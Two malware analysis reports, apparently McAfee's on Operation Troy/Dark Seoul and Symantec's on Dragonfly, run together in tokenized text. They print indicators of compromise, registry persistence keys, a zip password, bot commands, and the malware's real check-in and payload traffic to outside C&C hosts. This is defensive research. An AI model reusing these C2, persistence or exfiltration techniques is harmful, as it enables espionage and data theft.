Our further analysis led us to discover additional components that support our conclusion : • A remote - access Trojan was discovered to have compromised some of the target environments , specifically an internal server used to distribute updates to thousands of PCs .
This Trojan variant was compiled January 26 , and was detected by the security industry on March 25 .
McAfee detects this threat as RDN / Generic PWS.y ! io .
This Trojan was built with the Microsoft Visual C++ Version 2.9 compiler with a file size of 47 KB .
We have seen several wiper samples to date ; all were compiled January 31 .
The wiper itself is relatively small ( 24 KB ) and is introduced into the environment via a dropper Trojan that is 418 KB and was compiled the day of the attacks .
Upon executing the malware , the main dropper ( 9263e40d9823aecf9388b64de34eae54 ) creates the file AgentBase.exe , the MBR wiper component .
This file is placed in the infected user 's application data folder , executes , and immediately starts the countdown to wipe the system and render it unbootable .
This file was compiled approximately two months prior to the attack 's taking place .
The main dropper component was compiled the day of the attack , March 20 , at 4:07 am Seoul time .
The dropper installed the wiper , which destroyed the MBRs at around 2:00 pm Seoul time .
Once the dropper executed , the system were wiped within minutes .
Thus , these components likely were n't distributed until the time when the attackers wished to destroy these machines .
It 's not widely known that the attackers used a remote - access Trojan to compromise an internal server .
The attackers used this internal server to distribute the wiper component to the thousands of PCs .
The remote - access Trojan had a file size of 46 KB and was compiled on January 26 , five days before the MBR wiper was compiled .
As we concluded earlier , we have determined that the attackers had access to the environment prior to wiping the systems .
The remote - access Trojan was likely delivered to an internal PC via a spear - phishing campaign .
From this system the attackers accessed other internal resources .
The Trojan was designed to operate within Internet Explorer ; it launched a hidden instance of Internet Explorer and injected itself into the running process .
The Trojan immediately modified the properties in the registry to allow for remote connections to the system .
Linking malware to its developers is n't always an easy task .
Most attackers are careful enough to ensure they ca n't be traced .
This is especially important in cases such as cyberespionage , in which the intent is to remain invisible .
In our analysis we observed a number of unique attributes in the components involved in these attacks ; these markers allowed us to link specific samples to a specific group .
Two groups have taken credit for these attacks , but we can tell that the variants which wiped the systems link to the NewRomanic Cyber Army Team .
Although the Whois Hacking Team is more public due to its defacement of the network provider LG + U 's website , we can link this group to only one sample of a wiper , which operates differently than the others .
The Whois wiper is much larger , with a file size of 236 KB and was compiled March 19 , whereas the other wiper components are a mere 24 KB .
The larger size suggests the Whois wiper contains more functions .
Thus , we can definitively link NewRomanic to the samples used to wipe the MBRs of systems within the South Korean financial institution networks .
NewRomanic will remain the prime suspect involved in the attacks .
Confirming the link between NewRomanic and known wiper samples , we found a number of wiper samples contained either the string `` hastati '' or `` principes '' in the calling cards left by the attacker .
Not only did most of the wiper samples link to NewRomanic , but the remote - access Trojan can also be linked to the group .
The Trojan contained a build path that mentions Troy in the directory path , again consistent with the ancient Roman references used by this group .
It is highly unusual that two groups claim responsibility for these attacks .
No further information has been revealed as to who they are or what their motivations are ; this is another reason to suspect that these two groups are the same and are actually fabricated .
The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples .
The Whois Hacking Team sample was compiled March 19 at 1:57 pm local time and the NewRomanic dropper was compiled March 20 at 4:07 am local time .
The attacks on South Korean banks and media and the defacement of LG + U occurred approximately 2:00 pm local time on March 20 .
McAfee Labs investigated the differences between the two samples at a code level to determine if there were any similarities .
In spite of the fact that the wiper component originating from NewRomanic Cyber Army Team was 24 KB in size and the component from Whois was 236 KB , we did find similarities within the code .
The Whois sample is a dropper for a component that closely resembles the one used by the NewRomanic Cyber Army .
We found a significant number of matching subroutines and a large number of code segments with only minor differences .
These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers .
Public reports covering what is known as the Dark Seoul incident , which occurred on March 20 , 2013 , addressed only the MBR wiper components .
Many of the details of this incident have been examined , and most analysts conclude this was an isolated , though clearly coordinated , attack .
However , McAfee Labs has found that there was more to the incident than what was widely reported .
Our analysis has revealed a covert espionage campaign .
Typically this sort of advanced persistent threat ( APT ) campaign has targeted a number of sectors in various countries , but Operation Troy , as these attacks are now called , targets solely South Korea .
From our analysis of unique attributes within the malware samples we have determined that the initial code behind the `` Troy '' family of Trojans was created in 2010 , as was another component that was dropped by the Trojan HTTP Troy .
The malware used in these attacks were compiled to specifically target South Korea and used Korean - language resources in the binaries .
The malware connected to legitimate Korean domains that were running a bulletin board and sent a specific command to a PHP page to establish an IRC channel and receive commands .
McAfee Labs has determined that domestic espionage activities occurred before the March 20 attacks , most likely to gain intelligence regarding the targets to carry out further attacks ( such as the March 20 incident ) or to benefit the attackers in some other ways .
This spying operation had remained hidden and only now has been discovered through diligent research and collaboration .
We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems , given that some of the variants used in the attack were made to look as if they were antimalware update files from before March 20 .
The attackers who conducted the operation remained hidden for a number of years prior to the March 20 incident by using a variety of custom tools .
Our investigation into Dark Seoul has found a long - term domestic spying operation underway since at least 2009 .
The operation , all based on the same code , has attempted to infiltrate specific South Korean targets .
We call this Operation Troy , based on the frequent use of the word Troy in the compile path strings in the malware .
The prime suspect group in these attacks is the New Romanic Cyber Army Team , which makes frequent use of Roman and classical terms in their code .
While analyzing malware components from before the March 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the 3Rat remote administration tool client used on March 20 as well as to samples dating to 2010 .
Furthermore , we determined that through prior access to the victims ' networks , the attackers were able to upload the MBR wiper component and distribute it .
It is also possible that the campaign known as 10 Days of Rain is a byproduct of Operation Troy ; some of our analysis suggests that the malware Concealment Troy was present in these attacks .
NSTAR : 2010–2011 NSTAR appears to be the first production version of the Troy family .
This Trojan is based upon malware created for a military espionage campaign that first emerged in 2009 .
NSTAR is the first to use components in the same way that later variants of the Troy family do .
It included a shared DLL ( bs.dll ) that was found in the 2010 and 2011 variants .
Later variants use a modified version , HTTPSecurityProvider.dll , which employs nearly the same file - mapping function as used by bs.dll .
Most of these variants are compiled from the Work directory ; that 's fairly consistent throughout all versions .
The DLL was compiled using Microsoft Visual C++ Version 6 .
Those iterations were found in 2010 - 2011 .
The call graph generated for NSTAR 's bs.dll is identical with that of HTTP Troy .
They were compiled at least a year apart from each other .
The DLL was compiled March 3 , 2011 , and includes an OCX component that was compiled in late 2010 .
The OCX used a very different compile path , but bs.dll , the backdoor , is essentially the same as those seen in later versions .
The Work directory , with path shown below , is also used with Troy variants Concealment Troy and 3Rat Client , which were both compiled in 2013 .
We also found a file - mapping function in this variant similar to those in most of the newer versions .
The unique string beginning with `` FFFFFFF '' is identical and occurs throughout the later variants .
The malware establishes an IRC channel to receive real - time commands in the same manner as the military espionage malware .
Another variant from 2010 , EagleXP , is closely related to NSTAR and HTTP Troy based on reused components .
EagleXP used this compile path : Again we see the Work directory involved as in the other post-2010 malware used in this campaign .
A variant compiled May 27 , 2010 , also contained a very similar compile path .
We were able to obtain some traffic from the control server .
The May 27 variant , called Chang , operated in the same manner as other Troy variants and used the same bs.dll .
A Korean manufacturing website hosted both the control server and an IRC server .
Both the Chang and EagleXP variants are based on the same code that created NSTAR and later Troy variants .
These similarities confirm the attackers have operated for more than three years against South Korean targets .
During our investigation we dug into the attackers ' controlling botnet , which was used until 2013 .
The infrastructure relied upon on a network of hacked South Korean websites hosting IRC servers .
The infected clients in turn communicated with the IRC servers using RSA encryption and used functions imported from the Microsoft Cryptography API library .
The attackers hardcoded the control domains in bs.dll and distributed it in the final compiled Trojan code .
Each variant of each generation of Trojans contained different hardcoded strings pertaining to the control servers .
This shows that the attackers first compromised the future IRC server sites and then compiled the component and distributed it to infected targets .
The nickname for the bot can be determined by the outbound traffic and information written to the Windows registry .
One variant operating in June 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng .
The malware joined the IRC channel # god and sent several private messages to what was likely the control server to receive instructions .
In 2011 the attackers created the Trojan HTTP Troy , named from its compile path string ; this was the first of the Troy family of Trojans .
To date we have found only one sample of HTTP Troy .
Upon execution the malware launches a crippled GUI that allows the victim to install a screen saver displaying politically sensitive images .
We do n't know why the developers took the risk of making the Trojan visible .
The screensaver component ( chonanship.scr ) is not malicious and was compiled on December 12 , 2010 .
It contained images related to the sinking of the South Korean Navy ship Cheonan .
HTTP Troy was compiled on March 20 , 2011 , and contained the compile path Z : \source\1\HttpTroy\BsDll - up\Release\BsDll.pdb .
As we can see , HTTP Troy uses the same DLL as the NSTAR , Chang , and EagleXP variants did in 2010 .
This path was contained in a dropped DLL component that was used to establish a hidden IRC channel to the attackers ' control server .
The primary dropper file for this remote - access Trojan was disguised as AhnLab 's Smart Update Utility setup program .
The original filename was SUpdate.exe .
After executing , the remote - access Trojan makes a connection to sujewha.com , the IRC control server .
We found a second - generation Trojan based on HTTP Troy that included the compile path Z : \1Mission\Team_Project\ [ 2012.6~ ] \HTTP Troy\HttpDr0pper\Win32\Release .
This Trojan , Http Dr0pper , was compiled in 2012 from the HTTP Troy directory , indicating it is an advancement of the original HTTP Troy .
All of the variants from this point reuse a specific DLL , which in some instances is named HTTPSecurityProvider.dll and uses the Microsoft Cryptography API to secure communications .
We can track the reuse of this DLL based on the consistent file‑mapping function that appears throughout the variants .
We can determine that another variant , Tong ( based on the directory in which it was compiled ) , also reuses this DLL and contains the same function .
Furthermore , variants such as Concealment Troy that were compiled in 2013 contain the same function once decoded .
Still , some of the base code is reused in the supporting DLL for Concealment Troy .
After execution the Trojan makes a connection to the control server using specific parameters that include the IRC nickname .
This communication pattern is consistent with other variants that reference Troy .
The Tong variant contains the compile path E : \Tong\Work\Op\1Mission\Team_Project\ [ 2012.6~ ] \HTTP Trojan 2.0\HttpDr0pper\Win32\Release .
It also communicated using the same methods .
This Trojan was compiled on August 28 , 2012 .
TDrop is the third generation of HTTP Troy .
TDrop uses one of two DLL files , payload32.dll and payload64.dll , and injects one , depending on operating system , into svchost.exe .
Previous versions used bs.dll , which contained the code for communicating with the IRC botnet .
TDrop has some further functionality not present in HTTP Troy that extends this Trojan 's ability to operate on 64-bit machines and to evade automated analysis systems and emulation technologies .
The evasion routines check for the presence of debuggers and tracers that attach to the parent process .
This effectively causes the parent process to immediately terminate when under analysis by emulation or sandboxing systems that attempt to hook and monitor API calls coming from that process .
Furthermore , TDrop uses a DLL to run under nonprivileged accounts on Windows 7 .
This variant was compiled on January 15 , 2013 , and contained the compile path D : \Work\Op\Mission\TeamProject\ [ 2012.11~12 ] \TDrop\Dropper32\Release\Dropper.pdb .
The main executable , which extracts the other components , was compiled from the path Z : \Work\v3zip\misc.c and Z : \Work\v3unzip.c .
This is likely a compression tool to extract the files to the desktop .
Just as Http Dr0pper , TDrop uses the disguised dropper component AhnlabUpdate.exe .
The unique code is nearly identical to that used in Http Dr0pper with the exception of the last two characters .
When the main Trojan file executes , it launches RunCmd.exe , which itself does n't appear to be malicious .
RunCmd.exe then launches AhnlabUpdate.exe based on the specified filename in the associated RunCmd.ini file .
These files are created in the directory 114719_507_AhnlabUpdateKit , which sits in a temp directory created on the desktop .
It is obvious that the attackers were aware of the security product that the target environment used and attempted to make the malware appear as legitimate as possible .
AhnlabUpdate drops and runs an additional executable , which is the RAT payload that establishes a connection with the control server .
Another third - generation Troy family Trojan is Concealment Troy .
This version was compiled from the same directory as the 3Rat client found in the victims ' environments on March 20 .
Some components from Concealment Troy suggest that the source code was originally written in 2010 and was later compiled for use in this campaign .
The 64-bit component to install the backdoor on the victims ' systems contains an interesting compile path and was first created on November 28 , 2012 .
The 32-bit version was compiled January 23 , 2013 , and contained this compile path : Concealment Troy does not employ real - time IRC control as earlier versions did .
( Concealment Troy is a typical HTTP botnet .
) McAfee Labs has uncovered a sophisticated military spying network targeting South Korea that has been in operation since 2009 .
Our analysis shows this network is connected to the Dark Seoul incident .
Furthermore , we have also determined that a single group has been behind a series of threats targeting South Korea since October 2009 .
In this case the adversary had designed a sophisticated encrypted network designed to gather intelligence on military networks .
We have confirmed cases of Trojans operating through these networks in 2009 , 2010 , 2011 , and 2013 .
This network was designed to camouflage all communications between the infected systems and the control servers via the Microsoft Cryptography API using RSA 128-bit encryption .
Everything extracted from these military networks would be transmitted over this encrypted network once the malware identified interesting information .
What makes this case particularly interesting is the use of automated reconnaissance tools to identify what specific military information internal systems contained before the attackers tried to grab any of the files .
The attacks would have occurred in four general stages : • Initial compromise via a `` watering - hole attack , '' which would lead to the exploitation of the internal systems ( in the 2009 case ) .
( The attacker placed a zero - day exploit on a military social networking site .
) Later cases were likely spear phishing to more quickly get to the right targets .
• Malwareautomatically performs recon on target systems looking for documents of interest .
Malware can also scrape out passwords and registry information along with directory listing of interesting files .
• The attacker can request directory contents from infected systems based on the number of interesting files found .
Can selectively grab specific files as needed .
• Stolen files are transmitted via HTTP - encrypted channel to the attacker 's server .
The attacker 's encrypted network uses Microsoft 's Cryptography API library Version 1.0 to encrypt communication channels to the control servers over both HTTP and IRC .
The encryption uses a 128-bit RSA key , shown as imported and used by the following code .
This network operates over both HTTP and uses IRC as secondary channel for real - time operations .
The IRC network is based on the open - source library libircclient and everything sent over this IRC channel is encrypted via the Cryptography API .
The following commands are supported by IRC to control infected systems in real time .
This functionality enables the attacker to send and receive files on demand and execute remote commands .
The messages sent between client and servers are base64 encoded and then encrypted using the Cryptography API ; thus a message must be decoded and decrypted to be visible .
This highly sophisticated method provides for great flexibility over a secure encrypted channel that is not SSL .
• Get bot version and uptime • Get directory file listing , all drives or from specific path • Stop activities for a given period • Download file • Send local file to the server • Execute shell command • Connect to IRC server • Change nick ( IRC ) • Join channel ( IRC ) • IRC disconnect • Remove bot from system The HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server .
The encrypted network operates by scanning infected systems and categorizing those systems that contain interesting documents .
The malware does not extract every document that is found as a match through drive scanning ; rather it assigns a unique signature to the infected system according to what it contains .
Less interesting systems are less likely to have documents extracted from them .
The directory contents are uploaded to the attacker 's server , which lets the attacker grab documents at will and keeps the amount of network traffic low .
The theft of classified information is the primary purpose of this network and would occur through drive scanning .
Drive scanning locates classified information on target systems and gives the attacker an overall idea of what these military networks have .
The malware searches the root disk , counts the number of interesting files , and determines the level of that system 's importance to the attacker .
The search criteria are primarily specific file extensions and keywords in document titles .
The keywords are all military specific .
Some refer to specific military units and programs that operate in South Korea .
This function would determine only the number of interesting files that are contained on any given system ; another function would extract the list of files that match these search criteria .
In addition to searching for English keywords , the function searches for Korean ASCII characters that represent a subset of military terms .
Most keywords specific to military operations in South Korea are in English .
There is also a set of abbreviations .
The files to be sent to the attacker 's server are zipped using the open - source Zip Utils .
The component uses the password `` dkwero38oerA^t @ # .
'' We have consistently found this password in the malware dating back to 2009 .
It is used primarily to archive items to be stolen from infected systems .
In all of these threats we have seen the consistent use of bs.dll , a stripped down version of ip6ld.dll , which we have found in the military espionage cases .
We can connect not only similar functions within bs.dll from 2011 to date with those of the military cases in 2009 and 2010 , but also the shared encryption key for zipping classified information to be sent to the control server .
This ip6ld.dll is the same as another file , ~81923.dll ; both operate in the same manner .
Bs.dll appears to be used primarily for IRC botnet communications .
The component bs.dll has been seen in a number of Troy - era malware samples : Chang , EagleXP , NSTAR , Mail Attack , HTTP Troy , Tong , Http Dr0pper , etc .
The file Ip6ld.dll , which contains much of the logic described in these attacks , shares a number of common functions with bs.dll , including the zip encryption password .
In addition , the IRC and encryption functions are the same in both files , indicating they were built by the same individual or group .
The two functions are likely the same source code in different versions .
The primary difference between them is bs.dll 's lack of searching for specific extensions and terms that Ip6ld.dll and ~81923.dll contain .
This suggests bs.dll requires a second module and we have seen that with the Mail Attack variant , compiled in February 2011 , which contained both bs.dll and payload.dll , with the latter containing the military - specific search and extraction functions .
The following function found in bs.dll lists the contents of specified directories and zips those contents into an archive file with a password .
This function does n't have any criteria and is likely disabled in some cases , such as with HTTP Troy , which downloads a payload module to search for data .
Payload.dll appears to combine both drive searching and directory listing into a single function .
A separate action puts the directory contents into a separate file and prepares it to be sent to the remote server .
We have determined that some variants of Http Dr0pper will execute payload32.dll , which is essentially the same DLL that is found in TDrop .
This component contains military keywords .
One variant of Http Dr0pper made use of payload32.dll , which was compiled on August 23 , 2012 .
The TDrop version was compiled January 13 , 2013 .
This consistency confirms further that the operations against South Korea are primarily focused on military intelligence gathering and have attempted to break in since 2009 .
The espionage malware has the capability to destroy systems in the same way that the March 20 , 2013 , attacks disabled thousands of systems in South Korea .
This capability could be devastating if military networks were to suddenly be wiped after an adversary had gathered intelligence .
This was clearly the case with the March 20 Dark Seoul incident , in which we confirmed that the 3Rat Trojan gained access prior to the MBR - wiping event .
There was at least one limitation , however : We found the malware of February 2011 could wipe its targets only if it detected that it was being debugged or analyzed by a security product .
Through our research we have discovered a number of distinct subcampaigns as part of the overall Operation Troy , which has targeted military forces in South Korea to extract classified information .
These operations were designed to occur in 2009 through 2013 .
Recently we uncovered evidence to suggest that they continued just prior to Dark Seoul .
We can link the actor ( s ) responsible for Dark Seoul to these particular espionage campaigns through various technical means .
• The Troy - era malware is based on the same source code to create these specialized versions ( components shared over the years ) .
• The zip encryption password is found in almost all instances , with the exception of Concealment Troy .
• Consistent terms in the malware compile paths ( for example , Troy , Work , etc . ) .
• The same IRC botnet channel and encryption method are used throughout the variants .
• Military keywords are consistently found through the components spanning 2009–2013 , confirming the intent of this adversary .
• Use of the same string - obfuscation techniques in the 2009–2010 campaigns and the 2012–2013 campaigns .
McAfee Labs can connect the Dark Seoul and other government attacks to a secret , long - term campaign that reveals the true intention of the Dark Seoul adversaries : attempting to spy on and disrupt South Korea 's military and government activities .
The Troy - era malware is based on the same source code used to create these specialized variants and shares many commonalities , such as bs.dll and payload.dll , which are found consistently throughout the families .
The attackers have attempted since 2009 to install the capability to destroy their targets using an MBR wiper component , as seen in the Dark Seoul incident .
From our analysis we have established that Operation Troy had a focus from the beginning to gather intelligence on South Korean military targets .
We have also linked other high - profile public campaigns conducted over the years against South Korea to Operation Troy , suggesting that a single group is responsible .
A cyberespionage campaign against a range of targets , mainly in the energy sector , gave attackers the ability to mount sabotage operations against their victims .
The attackers , known to Symantec as Dragonfly , managed to compromise a number of strategically important organizations for spying purposes and , if they had used the sabotage capabilities open to them , could have caused damage or disruption to the energy supply in the affected countries .
The Dragonfly group , which is also known by other vendors as Energetic Bear , are a capable group who are evolving over time and targeting primarily the energy sector and related industries .
They have been in operation since at least 2011 but may have been active even longer than that .
Dragonfly initially targeted defense and aviation companies in the US and Canada before shifting its focus to US and European energy firms in early 2013 .
More recent targets have included companies related to industrial control systems .
Dragonfly has used spam email campaigns and watering hole attacks to infect targeted organizations .
The group has used two main malware tools : Trojan . Karagany and Backdoor . Oldrea .
The latter appears to be a custom piece of malware , either written by or for the attackers .
Symantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013 to June 2013 .
The email topics were related to office administration issues such as dealing with an account or problems with a delivery .
Identified targets of this campaign were mainly US and UK organizations within the energy sector .
In May 2013 , the attackers began to use the Lightsout exploit kit as an attack vector , redirecting targets from various websites .
The use of the Lightsout exploit kit has continued to date , albeit intermittently .
The exploit kit has been upgraded over time with obfuscation techniques .
The updated version of Lightsout became known as the Hello exploit kit .
A newer approach used by the attackers involves compromising the update site for several industrial control system ( ICS ) software producers .
They then bundle Backdoor . Oldrea with a legitimate update of the affected software .
To date , three ICS software producers are known to have been compromised .
The Dragonfly attackers used hacked websites to host command - and - control ( C & C ) software .
Compromised websites appear to consistently use some form of content management system .
The current targets of the Dragonfly group , based on compromised websites and hijacked software updates , are the energy sector and industrial control systems , particularly those based in Europe .
While the majority of victims are located in the US , these appear to mostly be collateral damage .
That is , many of these computers were likely infected either through watering hole attacks or update hijacks and are of no interest to the attacker .
By examining victims with active infections – where additional malicious activity has been detected – it is possible to gather a more accurate picture of ' true ' victims .
The most active infections , as in Figure 2 , are in Spain , followed in order by the US , France , Italy , and Germany .
Dragonfly uses two main pieces of malware in its attacks .
Both are Remote Access Tool ( RAT ) type malware which provide the attackers with access and control of compromised computers .
Dragonfly 's favored malware tool is Backdoor . Oldrea , which is also known as Havex or the Energetic Bear RAT .
Oldrea acts as a back door for the attackers on to the victim 's computer , allowing them to extract data and install further malware .
Oldrea appears to be custom malware , either written by the group itself or created for it .
This provides some indication of the capabilities and resources behind the Dragonfly group .
The second main tool used by Dragonfly is Trojan . Karagany .
Unlike Oldrea , Karagany was available on the underground market .
The source code for version 1 of Karagany was leaked in 2010 .
Symantec believes that Dragonfly may have taken this source code and modified for its own use .
Symantec found that the majority of computers compromised by the attackers were infected with Oldrea .
Karagany was only used in around 5 percent of infections .
The two pieces of malware are similar in functionality and what prompts the attackers to choose one tool over another remains unknown .
The Dragonfly group has used at least three infection tactics against targets in the energy sector .
The earliest method was an email spear phishing campaign , which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment .
Infected emails had one of two subject lines : `` The account '' or `` Settlement of delivery problem '' .
All of the emails were from a single Gmail address .
Figure 3 displays the number of different recipients per day .
The spam campaign began in February 2013 and continued into June 2013 .
Symantec identified seven different organizations targeted in this campaign .
At least one organization was attacked intermittently for a period of 84 days .
In June 2013 , the attackers shifted their focus to watering hole attacks .
They compromised a number of energy- related websites and injected an iframe into each of them .
This iframe then redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit .
This in turn exploited either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim 's computer .
The fact that the attackers compromised multiple legitimate websites for each stage of the operation is further evidence that the group has strong technical capabilities .
In September 2013 , Dragonfly began using a new version of this exploit kit , known as the Hello exploit kit .
The landing page for this kit contains JavaScript which fingerprints the system , identifying installed browser plugins .
The victim is then redirected to a URL which in turn determines the best exploit to use based on the information collected .
Figure 4 shows the compromised websites categorized into their respective industries .
Fifty percent of identified targets were energy industry related and thirty percent were energy control systems , as shown in Figure 4 .
A clear shift in the attackers targeting can be seen in March 2014 when energy control systems become the primary target .
The most ambitious attack vector used by Dragonfly was the compromise of a number of legitimate software packages .
Three different ICS equipment providers were targeted and malware was inserted into the software bundles they had made available for download on their websites .
Analysis of the compilation timestamps on the malware used by the attackers indicate that the group mostly worked between Monday and Friday , with activity mainly concentrated in a nine - hour period that corresponded to a 9 am to 6 pm working day in the UTC + 4 time zone .
The Dragonfly group is technically adept and able to think strategically .
Given the size of some of its targets , the group found a `` soft underbelly '' by compromising their suppliers , which are invariably smaller , less protected companies .
Identification of this group is based on the use of two malware families and an exploit kit .
The malware families utilized are Backdoor . Oldrea and Trojan . Karagany .
The exploit kit is known as Lightsout and/or Hello .
Hello is an updated iteration of Lightsout that the Dragonfly group began to use in September 2013 .
Use of Backdoor . Oldrea appears to be limited to the Dragonfly group .
In addition , specific instances of Trojan .
Karagany have been used by this group .
Karagany is a Russian RAT sold on underground forums .
Instances of this malware related to the Dragonfly group are identified based on them being delivered through the Lightsout exploit kit and also a particular packer that this group used .
Symantec detects the Trojan . Karagany packer used by this group as Trojan . Karagany ! gen1 .
The Lightsout exploit kit is a simple exploit kit that is consistently used to deliver primarily Backdoor . Oldrea and , in several instances , Trojan . Karagany .
A number of sites that use content management systems were exploited and an iframe was used in order to redirect visitors to sites hosting the Lightsout exploit kit .
An example of an injected iframe can be seen in figure 7 .
The exploit kit uses browser ( e.g .
Internet Explorer and Firefox ) and Java exploits in order to deliver either Backdoor . Oldrea or Trojan . Karagany .
An example of the structure of the Lightsout exploit kit can be seen Table 1 .
Note that file names and exploits used may vary .
In September 2013 , the Dragonfly group began using a new version of Lightsout , also known as the Hello exploit kit .
The JavaScript included in the landing page redirects the browser to a URL that depends on the fonts installed on the system , browser add - ons , the OS version , and the user agent .
At this point , it determines the best exploit to use , based on the information provided , and generates an appropriate URL to redirect the user to the appropriate exploit / payload .
The following shows an example of such a request : [ EK_DETERMINED_PARAMETER ] may be anything listed in Table 2 .
The parameters dwe and dwd relate to which payload is requested for download , for example : • When a Backdoor . Oldrea payload is requested [ EK_DETERMINED_PARAMETER ] is dwd • When a Karagany ! gen1 payload is requested [ EK_DETERMINED_PARAMETER ] is dwe The values of the [ EK_DETERMINED_PARAMETER ] variable may relate to the two different file types represented by Backdoor . Oldrea and Trojan .
Karagany ! gen1 payloads .
Oldrea payloads are DLL files ( URLs end in `` d '' for DLL ? ) while Karagany ! gen1 payloads are portable executables ( URLs end in `` e '' for EXE ? ) .
At the core of Backdoor . Oldrea is a persistent component that interacts with C & C servers to download and execute payloads .
The components are downloaded by reaching out to the C & C server and performing a GET request which returns an HTML page containing a base64 encoded string between two comments marked with the ' havex ' string .
• % Temp % \qln.dbx • % System % \TMPprovider038.dll In this specific example , the ' 038 ' in the file name indicates the major version number .
• HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ '' TmProvider '' • HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ '' TmProvider '' • HKEY_LOCAL_MACHINE\ SOFTWARE\Microsoft\Internet Explorer\InternetRegistry\ '' fertger '' • HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\InternetRegistry • Backdoor . Oldrea injects code into explorer.exe .
Post infection , Backdoor . Oldrea will attempt to collect system information such as OS , user name , computer name , country , language , nation , Internet adapter configuration information , available drives , default browser , running processes , desktop file list , My Documents , Internet history , program files , and root of available drives .
It also collects data from Outlook ( address book ) and ICS related software configuration files .
This data is collected and written to a temporary file in an encrypted form before it is POST'ed to a remote C & C server .
The following are examples of a POST request and a POST response : POST request example : POST /wp08/wp - includes / dtcla.php ? id=285745296322896178920098FD80 - 20 & v1=038 & v2=17 0393861 & q=5265882854508EFCF958F979E4 HTTP/1.1 User - Agent : Mozilla/5.0 ( Windows ; U ; Windows NT 6.1 ; en - US ) AppleWebKit/525.19 ( KHTML , like Gecko ) Chrome/1.0.154.36 Safari/525.19 Host : toons.freesexycomics.com Content - Length : 0 Cache - Control : no - cache POST response example : HTTP/1.1 200 OK Date : We d , 22 Jan 2014 13:40:48 GMT Content - Type : text / html Transfer - Encoding : chunked Connection : keep - alive Server : Apache/1.3.37 ( Unix ) Cache - Control : no - cache 9f65 < html > < head > < mega http - equiv='CACHE - CONTROL ' content='NO - CACHE ' > < / head > < body > No data ! < ! -- havexQlpoOTFBWSZTWWYvDI0BOsD//////////////////////////////////// /////////4oB+93VVXu69DuN7XYzds9yt49Ques [ ...
TRUNCATED FOR READABILITY ] + yUW3zfTxWAOstsCwCckdW5 AH5Q6vbbCu7GputPt5CSfgPCAKXcAOOICMsqliACGYEhAQT3v9eD M92D/8XckU4UJBmLwyNA==havex -- > < /body > < /head > Various samples process the C & C responses differently .
In one example , the sample searches for the data enclosed by the tag ' havex ' .
Once the data is found , it is decoded using standard base64 + bzip2 and also a xor layer with bytes from the string 1312312 .
The decoded data contains a small header followed by an executable MZ - file .
Another sample was found to use standard base64 + reverse xor + RSA-2048 for decrypting received data .
The decrypted data consists of a 6 byte command concatenated with an MZ file .
The MZ file is compressed with the lzma algorithm .
RSA keys for decryption , together with other initial configuration information , are stored in the registry in base64 form .
This section includes information about identified payloads downloaded by Backdoor . Oldrea .
The following is a brief description of the functionality for each identified component : • Tmpprovider is a persistent component that interacts with the C & C server ( downloads and executes payloads ) .
• The InstallerFormDll component usually embeds another executable ( DLL ) in its resource section to be loaded .
The sample analyzed carried a Web browser password recovery tool originating from http : //securityxploded.com / browser - password - decryptor.php • The RunExeCmdSingle component is a DLL file that drops and executes another executable .
The export ' runDll ' of this file is where the logic is implemented .
• DropCommandsCmd is a cleanup module , used to remove traces of itself from the infected computer .
• The GetFileCmd modules check for the existence of specific files on the infected host .
The two samples look for the ICS related software file and Outlook 's autocomplete address book file ( outlook.nk2 ) .
Trojan . Karagany is a back door used primarily for recon .
It is designed to download and install additional files and exfiltrate data .
Samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer / protector for the payload .
Where present in samples , the Delphi packer is configured to use ' neosphere ' as a key to decrypt the payload .
The following is a brief overview of the functionality of Trojan . Karagany : • Can upload , download , and execute files on the system • Has plugin capability ( may load several plugins for added functionality , such as Web injects ) • Payload is approximately 72Kb in size and is programmed in C / C++ • Contains a small embedded DLL file , which monitors WSASend and send APIs for capturing ' Basic Authentication ' credentials Trojan . Karagany creates a folder in the user APPDATA directory and chooses the directory name from the following list : • Microsoft WCF services • Broker services • Flash Utilities • Media Center Programs • Policy Definitions • Microsoft Web Tools • Reference Assemblies • Analysis Services • InstallShield Information • IIS SQL Server • Diagnostics • NTAPI Performance • WPF Platform It copies itself in the created directory with hidden and system attributes using a file name chosen from the following list : • SearchIndexer.exe • ImeBroker.exe • fsutil.exe • PnPutil.exe • BdeUISrv.exe • WinSAT.exe • pwNative.exe • SnippingTool.exe • DFDWizard.exe • PrintBrmEngine.exe • WbemMonitor.exe • dxpserver.exe • PowerMng.exe Trojan . Karagany copies itself with hidden and system attributes where it was first executed as err.log [ DIGITS ] .
It then copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before the file extension .
This may fool ordinary users into thinking that this folder contains a legitimate application , for example PnPutil .exe
.
Trojan . Karagany ! gen1 may create the following additional files in the installation folder : • Form.api • inact.api • prog.cer • Cent.api • ie.pdb It then creates a C : \ProgramData\Mail\MailAg\gl directory as a temporary directory used for uploading files .
Trojan . Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts .
Trojan . Karagany first checks for a live Internet connection by visiting Microsoft or Adobe websites .
It will only reach out to its C & C server once this check is successful .
Example HTTP Requests Internet connection test to Microsoft GET /en - us / default.aspx HTTP/1.1 Accept - Encoding : gzip , deflate Content - Type : application / x - www - form - urlencoded Host : microsoft.com Cookie : MC1=V=3 & GUID= < 32 character guid > Connection : Keep - Alive Cache - control : no - cache Internet connection test to Adobe using identifiant parameter POST /geo / productid.php HTTP/1.1 Content - Type : application / x - www - form - urlencoded Host : adobe.com ...
identifiant=51032 _ 175129256364 Example POST request for C & C server check - in POST /check _ value.php HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; .NET
CLR 2.0.50727 ) Host : 93.188.161.235 ...
